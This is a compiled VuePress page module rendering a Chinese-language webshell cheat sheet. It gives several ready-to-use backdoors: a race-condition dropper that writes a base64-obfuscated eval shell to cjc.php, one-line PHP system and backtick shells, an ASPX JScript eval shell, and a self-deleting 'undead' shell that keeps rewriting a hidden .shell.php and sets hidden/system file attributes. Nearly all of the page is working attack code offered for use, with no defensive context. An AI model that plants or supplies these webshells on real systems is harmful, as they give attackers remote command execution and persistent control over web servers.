import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as t,e as i}from"./app-16f01191.js";const n={},s=i(`<h1 id="写马的马-条件竞争" tabindex="-1"><a class="header-anchor" href="#写马的马-条件竞争" aria-hidden="true">#</a> 写马的马(条件竞争)</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php fputs(fopen(&#39;cjc.php&#39;,&#39;w&#39;),&#39;&lt;?php $b = &quot;YXNzZXJ0&quot;;$a = base64_decode($b);@$a(eval($_POST[&quot;pass&quot;]));?&gt;&#39;);?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="小马" tabindex="-1"><a class="header-anchor" href="#小马" aria-hidden="true">#</a> 小马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php $a=&quot;system&quot;;@$a($_REQUEST[&quot;pass&quot;]);?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="极简马" tabindex="-1"><a class="header-anchor" href="#极简马" aria-hidden="true">#</a> 极简马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?=\`$_GET[1]\`;;?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="js马" tabindex="-1"><a class="header-anchor" href="#js马" aria-hidden="true">#</a> JS马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="不死马" tabindex="-1"><a class="header-anchor" href="#不死马" aria-hidden="true">#</a> 不死马</h1><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
  set_time_limit(0);
  ignore_user_abort(1);
  unlink(__FILE__);
  $filename = &#39;.shell.php&#39;;
while(1){
    $content = &quot;xxxxx&quot;;
  @file_put_contents(&quot;.shell.php&quot;, $content);
  eval(system(&quot;Attrib +s +a +h +r .shell.php&quot;));
}
  echo &quot;1&quot;;
  usleep(1);
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>xxxxx</code>写马的内容</p>`,11),d=[s];function l(r,u){return a(),t("div",null,d)}const v=e(n,[["render",l],["__file","木马.html.vue"]]);export{v as default};
